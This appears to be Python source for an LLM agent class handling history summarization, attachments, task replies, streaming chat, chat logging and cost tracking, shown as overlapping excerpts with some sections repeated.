206            self.total_input_tokens += usage.get("input_tokens", 0)
207            self.total_output_tokens += usage.get("output_tokens", 0)
208            self.total_cost_usd += usage.get("cost_usd", 0.0)
209            self._persist_cost()
210            self._history_summary = summary.strip()
211            self._conversation_history = to_keep
212            self.persist("history_summary", self._history_summary)
213            self.persist("conversation_history", self._conversation_history)
214            logger.info(
215                f"[{self.name}] History summarized: {len(to_compress)} messages → summary ({len(summary)} chars), keeping {len(to_keep)}"
216            )
217        except Exception as e:
218            logger.warning(f"[{self.name}] Summarization failed: {e} — truncating instead")
219            self._conversation_history = self._conversation_history[-self.max_history :]
220
221    def _build_messages_with_summary(self, n: int) -> list[dict]:
222        """Build the message list to send to the LLM, prepending the rolling summary
223        as context if one exists.
224        """
225        recent = self._conversation_history[-n:]
226        if not self._history_summary:
227            return recent
228        # Inject summary as a user/assistant exchange so it fits the messages format
229        summary_ctx = [
230            {
231                "role": "user",
232                "content": f"[Context from earlier in our conversation]\n{self._history_summary}",
233            },
234            {"role": "assistant", "content": "Understood, I have that context."},
235        ]
236        return summary_ctx + recent
237
238    def _record_user_turn(self, user_message: str, blocks: list[dict] | None, ts: float) -> None:
239        """Append the user's turn, keeping a text stand-in for any attachments.
240
241        The blocks themselves are never stored: a base64 payload in history is
242        written to disk every turn and re-sent on every turn after it. The
243        stand-in rides alongside the message rather than inside it, so the
244        content stays exactly what the user typed — callers that match on it
245        (main's live-context prefix swap) keep working.
246        """
247        turn: dict[str, Any] = {"role": "user", "content": user_message, "ts": ts}
248        if blocks:
249            turn["attachments_text"] = flatten(blocks, limit=HISTORY_TEXT_LIMIT)
250        self._conversation_history.append(turn)
251
252    def _history_for_request(self, blocks: list[dict] | None) -> list[dict]:
253        """The messages to send, with this turn's attachments spliced in.
254
255        Older turns carry their stand-in; the current one carries the real
256        thing — blocks where the provider takes them, and the full flattened
257        text where it does not, so a file is never silently dropped.
258        """
259        history: list[dict] = []
260        for m in self._build_messages_with_summary(self.max_history):
261            if not isinstance(m, dict):
262                continue
263            if m.get("role") not in ("user", "assistant") or m.get("content") is None:
264                continue
265            content = str(m["content"])
266            stand_in = m.get("attachments_text")
267            if stand_in:
268                content = f"{stand_in}\n\n{content}"
269            history.append({"role": m["role"], "content": content})
270
271        if blocks and history and history[-1]["role"] == "user":
272            text = str(self._conversation_history[-1].get("content", ""))
273            if self.llm is not None and self.llm.supports_blocks():
274                # Blocks lead, question follows: the turn reads as being about
275                # the files rather than the other way round.
276                history[-1]["content"] = [*blocks, {"type": "text", "text": text}]
277            else:
278                history[-1]["content"] = f"{flatten(blocks)}\n\n{text}"
279        return history
280
281    async def handle_message(self, msg: Message):
282        if msg.type == MessageType.TASK:
283            await self._handle_task(msg)
284
285    async def _reply_to_task(self, msg: Message, result: dict) -> None:
286        """Answer a task's sender, echoing `_task_id` so their future resolves.
287
288        Every exit from `_handle_task` goes through here, including the failures.
289        A path that returns without replying leaves the caller blocked until its
290        own timeout, and the reason is visible only in this side's log — so the
291        caller cannot tell a slow task from a dead one.
292
293        Senders that supplied no reply address get nothing, which keeps
294        fire-and-forget tasks from gaining a phantom reply.
295        """
296        payload_dict = msg.payload if isinstance(msg.payload, dict) else {}
297        reply_to = payload_dict.get("_reply_to") or msg.reply_to or msg.sender_id
298        if not reply_to:
299            return
300        task_id = payload_dict.get("_task_id")
301        if task_id:
302            result = {**result, "_task_id": task_id}
303        await self.send(reply_to, MessageType.RESULT, result)
304
305    async def _handle_task(self, msg: Message):
306        if isinstance(msg.payload, dict):
307            # Accept "text", "task", "message", or fall back to JSON dump
308            task_text = (
309                msg.payload.get("text")
310                or msg.payload.get("task")
311                or msg.payload.get("message")
312                or msg.payload.get("query")
313                or str(msg.payload)
314            )
315        else:
316            task_text = str(msg.payload) if msg.payload is not None else ""
317        self._current_task = task_text[:60]
318
319        if self.llm is None:
320            logger.warning(f"[{self.name}] No LLM provider configured.")
321            await self._reply_to_task(msg, {"text": "[No LLM configured]", "task": task_text})
322            return
323
324        try:
325            check_cost_limit()
326        except RuntimeError as e:
327            await self._reply_to_task(msg, {"text": str(e), "task": task_text})
328            return
329
330        start = time.time()
331        try:
332            self._conversation_history.append({"role": "user", "content": task_text, "ts": start})
333
334            safe_history = [
335                {"role": m["role"], "content": str(m["content"])}
336                for m in self._conversation_history[-self.max_history :]
337                if isinstance(m, dict) and m.get("role") in ("user", "assistant")
338            ]
339            response, usage = await self.llm.complete(
340                messages=safe_history,
341                system=self._system_prompt_with_now(),
342            )
343
344            self._conversation_history.append(
345                {"role": "assistant", "content": response, "ts": time.time()}
346            )
347            self.metrics.tasks_completed += 1
348            duration = time.time() - start
349
350            self.total_input_tokens += usage.get("input_tokens", 0)
351            self.total_output_tokens += usage.get("output_tokens", 0)
352            self.total_cost_usd += usage.get("cost_usd", 0.0)
353
354            # Persist after each exchange
355            self.persist("conversation_history", self._conversation_history)
356            self._persist_cost()
357
358            # Publish completion
359            await self._mqtt_publish(
360                f"agents/{self.actor_id}/completed",
361                {
362                    "result_preview": response[:200],
363                    "duration": duration,
364                    "task": task_text[:60],
365                },
366            )
367
368            await self._reply_to_task(
369                msg, {"text": response, "task": task_text, "duration": duration}
370            )
371
372        except Exception as e:
373            self.metrics.tasks_failed += 1
374            self.state_value = "failed_task"
375            logger.error(f"[{self.name}] LLM task failed: {e}", exc_info=True)
376            # The caller is waiting on a future; tell it the turn is over rather
377            # than leaving it to time out with no idea what happened.
378            await self._reply_to_task(msg, {"text": f"[error] {e}", "task": task_text})
379
380        finally:
381            self._current_task = "idle"
382
383    async def chat(self, user_message: str, attachments: list[dict] | None = None) -> str:
384        """Direct async call - useful for the main conversation actor.
385
386        `attachments` are content blocks from `llm.attachments.to_blocks`, sent
387        with this turn only.
388        """
389        if self.llm is None:
390            return "[No LLM configured]"
391        try:
392            check_cost_limit()
393        except RuntimeError as e:
394            return str(e)
395
396        self.metrics.messages_processed += 1
397        ts_user = time.time()
398        self._record_user_turn(user_message, attachments, ts_user)
399
400        safe_history = self._history_for_request(attachments)
401        response, usage = await self.llm.complete(
402            messages=safe_history,
403            system=self._system_prompt_with_now(),
404        )
405        ts_reply = time.time()
406        self._conversation_history.append(
407            {"role": "assistant", "content": response, "ts": ts_reply}
408        )
409        await self._maybe_summarize()
410        self.persist("conversation_history", self._conversation_history)
411        self._log_chat_turn(user_message, response, ts_user=ts_user, ts_reply=ts_reply)
412
413        # Accumulate token usage and cost
414        self.total_input_tokens += usage.get("input_tokens", 0)
415        self.total_output_tokens += usage.get("output_tokens", 0)
416        self.total_cost_usd += usage.get("cost_usd", 0.0)
417        self._persist_cost()
418
419        await self._mqtt_publish(
420            f"agents/{self.actor_id}/metrics",
421            self._build_metrics(),
422        )
423        return response
424
425    async def chat_stream(
426        self, user_message: str, attachments: list[dict] | None = None
427    ) -> AsyncGenerator[str | dict[str, Any], None]:
428        """Streaming version of chat(). Yields text chunks, then a final usage dict.
429        The caller is responsible for printing chunks as they arrive.
430
431        `attachments` are content blocks from `llm.attachments.to_blocks`, sent
432        with this turn only.
433
434        Usage:
435            async for chunk in agent.chat_stream("hello"):
436                if isinstance(chunk, dict):
437                    usage = chunk   # final usage summary
438                else:
439                    print(chunk, end="", flush=True)
440        """
441        try:
442            check_cost_limit()
443        except RuntimeError as e:
444            yield str(e)
445            return
446
447        # Not hasattr: `stream` is defined on the base, so every provider has
448        # one. What varies is whether the provider implemented it.
449        if self.llm is None or not self.llm.supports_streaming():
450            # Fallback: non-streaming — yield whole response as single chunk
451            response = await self.chat(user_message, attachments)
452            yield response
453            return
454
455        self.metrics.messages_processed += 1
456        self._record_user_turn(user_message, attachments, time.time())
457
458        full_text = []
459        usage = {}
460
461        safe_history = self._history_for_request(attachments)
462        try:
463            async for chunk in self.llm.stream(
464                messages=safe_history,
465                system=self._system_prompt_with_now(),
466            ):
467                if isinstance(chunk, dict):
468                    usage = chunk
469                else:
470                    full_text.append(chunk)
471                    yield chunk
472        except BaseException:
473            # Interrupted mid-stream (Ctrl+C, task cancellation, network error).
474            # Persist whatever chunks arrived so neither the user message nor
475            # the partial response are lost on restart.
476            if full_text:
477                partial = "".join(full_text)
478                self._conversation_history.append({"role": "assistant", "content": partial})
479                self.persist("conversation_history", self._conversation_history)
480            raise
481
482        response = "".join(full_text)
483        if usage.get("error"):
484            # The reply is kept — the tokens are real — but this is the only
485            # place the truncation is visible, so it must not pass in silence.
486            logger.warning(
487                "[%s] streamed reply is incomplete after %d chars: %s",
488                self.name,
489                len(response),
490                usage.get("error", ""),
491            )
492        self._conversation_history.append(
493            {"role": "assistant", "content": response, "ts": time.time()}
494        )
495        await self._maybe_summarize()
496        self.persist("conversation_history", self._conversation_history)
497
498        self.total_input_tokens += usage.get("input_tokens", 0)
499        self.total_output_tokens += usage.get("output_tokens", 0)
500        self.total_cost_usd += usage.get("cost_usd", 0.0)
501        self._persist_cost()
502
503        await self._mqtt_publish(
504            f"agents/{self.actor_id}/metrics",
505            self._build_metrics(),
506        )
507
508        # Yield final usage dict so caller can log it
509        yield usage
510
511    def _log_chat_turn(self, user_msg: str, reply: str, ts_user: float, ts_reply: float) -> None:
512        """Write both halves of a turn to the SQLite chat_log."""
513        db = get_db()
514        if db is not None:
515            try:
516                db.write_chat_log(
517                    ts=ts_user,
518                    agent_name=self.name,
519                    role="user",
520                    content=user_msg,
521                    session_id=self.actor_id,
522                )
523                db.write_chat_log(
524                    ts=ts_reply,
525                    agent_name=self.name,
526                    role="assistant",
527                    content=reply,
528                    session_id=self.actor_id,
529                )
530            except Exception as exc:
531                # Warning, not debug: this branch swallowed an AttributeError for
532                # every chat turn (the call named a method that does not exist),
533                # and at debug level nothing ever surfaced. Losing chat history is
534                # worth a log line even though it must not break the turn.
535                logger.warning("[%s] chat_log SQLite write failed: %s", self.name, exc)
536
537    def _persist_cost(self):
538        """Write lifetime cost to durable SQLite storage after each exchange."""
539        delta = self.total_cost_usd - self._last_persisted_usd
540        if delta > 0:
541            accumulate_global_cost(delta)
542            self._last_persisted_usd = self.total_cost_usd
543        self.persist(
544            "_final_cost",
545            {
546                "input_tokens": self.total_input_tokens,
547                "output_tokens": self.total_output_tokens,
548                "cost_usd": round(self.total_cost_usd, 6),
549                "name": self.name,
550            },
551        )
552
553    def _build_metrics(self) -> dict:
554        m = super()._build_metrics()
555        m["input_tokens"] = self.total_input_tokens
556        m["output_tokens"] = self.total_output_tokens
557        m["cost_usd"] = round(self.total_cost_usd, 6)
558        return m
559
560    def clear_history(self):
561        self._conversation_history = []

async def on_start(self): 
100    async def on_start(self):
101        _ = asyncio.create_task(refresh_pricing())
102        # Restore conversation history and rolling summary from persistence
103        saved = self.recall("conversation_history", [])
104        clean = []
105        for m in saved:
106            if not isinstance(m, dict):
107                continue
108            role = m.get("role", "")
109            content = m.get("content", "")
110            if role not in ("user", "assistant"):
111                continue
112            if not isinstance(content, str):
113                content = str(content)
114            if content.strip():
115                entry: dict = {"role": role, "content": content}
116                if "ts" in m and isinstance(m["ts"], (int, float)):
117                    entry["ts"] = m["ts"]
118                clean.append(entry)
119        self._conversation_history = clean[-self.max_history :]
120        self._history_summary = self.recall("history_summary", "")
121
122        # Restore lifetime cost so heartbeats carry accurate totals after restart.
123        # Only into a fresh instance: the supervisor restarts by building a new
124        # agent, but the start command restarts this same object, whose totals
125        # are already the live ones — adding the persisted values there doubles
126        # the agent's lifetime spend, and that figure reaches both the dashboard
127        # headline and the durable ledger.
128        #
129        # All three are checked, not just the cost: a locally hosted model with
130        # no pricing leaves cost at zero while tokens accumulate, and those would
131        # double on their own.
132        if not (self.total_input_tokens or self.total_output_tokens or self.total_cost_usd):
133            saved_cost = self.recall("_final_cost", {})
134            if isinstance(saved_cost, dict):
135                self.total_input_tokens += saved_cost.get("input_tokens", 0)
136                self.total_output_tokens += saved_cost.get("output_tokens", 0)
137                self.total_cost_usd += saved_cost.get("cost_usd", 0.0)
138        # Align persisted baseline so global cost doesn't re-add lifetime spend on first
139        # _persist_cost() after restart.
140        self._last_persisted_usd = self.total_cost_usd
141
142        # Migration: if _messages_processed key doesn't exist yet, seed from
143        # conversation_history so the overview counter isn't always 0 on first
144        # start after upgrading. messages_processed was set from SQLite in
145        # actor.start() — if it's still 0 here, the key was absent.
146        if self.metrics.messages_processed == 0 and self._conversation_history:
147            user_turns = sum(1 for m in self._conversation_history if m.get("role") == "user")
148            self.metrics.messages_processed = user_turns
149
150        # Publish capability manifest so main's topic registry knows this agent exists
151        description = (
152            getattr(self, "DESCRIPTION", None)
153            or (self.__class__.__doc__ or "").strip().split("\n")[0]
154            or self.name
155        )
156        capabilities = getattr(self, "CAPABILITIES", [])
157        input_schema = getattr(self, "INPUT_SCHEMA", {})
158        output_schema = getattr(self, "OUTPUT_SCHEMA", {})
159        await self.publish_manifest(
160            description=description,
161            capabilities=capabilities,
162            input_schema=input_schema,
163            output_schema=output_schema,
164        )

437                    usage = chunk   # final usage summary
438                else:
439                    print(chunk, end="", flush=True)
440        """
441        try:
442            check_cost_limit()
443        except RuntimeError as e:
444            yield str(e)
445            return
446
447        # Not hasattr: `stream` is defined on the base, so every provider has
448        # one. What varies is whether the provider implemented it.
449        if self.llm is None or not self.llm.supports_streaming():
450            # Fallback: non-streaming — yield whole response as single chunk
451            response = await self.chat(user_message, attachments)
452            yield response
453            return
454
455        self.metrics.messages_processed += 1
456        self._record_user_turn(user_message, attachments, time.time())
457
458        full_text = []
459        usage = {}
460
461        safe_history = self._history_for_request(attachments)
462        try:
463            async for chunk in self.llm.stream(
464                messages=safe_history,
465                system=self._system_prompt_with_now(),
466            ):
467                if isinstance(chunk, dict):
468                    usage = chunk
469                else:
470                    full_text.append(chunk)
471                    yield chunk
472        except BaseException:
473            # Interrupted mid-stream (Ctrl+C, task cancellation, network error).
474            # Persist whatever chunks arrived so neither the user message nor
475            # the partial response are lost on restart.
476            if full_text:
477                partial = "".join(full_text)
478                self._conversation_history.append({"role": "assistant", "content": partial})
479                self.persist("conversation_history", self._conversation_history)
480            raise
481
482        response = "".join(full_text)
483        if usage.get("error"):
484            # The reply is kept — the tokens are real — but this is the only
485            # place the truncation is visible, so it must not pass in silence.
486            logger.warning(
487                "[%s] streamed reply is incomplete after %d chars: %s",
488                self.name,
489                len(response),
490                usage.get("error", ""),
491            )
492        self._conversation_history.append(
493            {"role": "assistant", "content": response, "ts": time.time()}
494        )
495        await self._maybe_summarize()
496        self.persist("conversation_history", self._conversation_history)
497
498        self.total_input_tokens += usage.get("input_tokens", 0)
499        self.total_output_tokens += usage.get("output_tokens", 0)
500        self.total_cost_usd += usage.get("cost_usd", 0.0)
501        self._persist_cost()
502
503        await self._mqtt_publish(
504            f"agents/{self.actor_id}/metrics",
505            self._build_metrics(),
506        )
507
508        # Yield final usage dict so caller can log it
509        yield usage

Streaming version of chat(). Yields text chunks, then a final usage dict. The caller is responsible for printing chunks as they arrive.

attachments are content blocks from llm.attachments.to_blocks, sent with this turn only.

Usage: async for chunk in agent.chat_stream("hello"): if isinstance(chunk, dict): usage = chunk # final usage summary else: print(chunk, end="", flush=True)
